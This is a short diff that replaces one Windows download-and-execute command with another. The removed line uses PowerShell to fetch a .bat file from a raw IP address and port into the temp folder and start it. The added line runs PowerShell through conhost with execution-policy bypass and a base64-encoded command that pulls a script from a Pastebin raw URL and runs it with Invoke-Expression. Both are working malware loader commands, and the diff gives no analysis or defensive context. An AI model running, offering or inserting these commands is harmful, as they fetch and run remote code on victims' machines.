@@ -1,1 +1,2 @@
-powershell -c "Invoke-WebRequest -Uri 'http://85.209.129.37:5504/ld.bat' -OutFile "%temp%\ld.bat" -UseBasicParsing; Start-Process "%temp%\ld.bat""
+conhost cmd /c powershell /ep bypass /e JAByAGEAIAA9ACAAaQByAG0AIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAGUAOAByAFEAVQByAGsAbgAnADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAYQA= /W 1
+
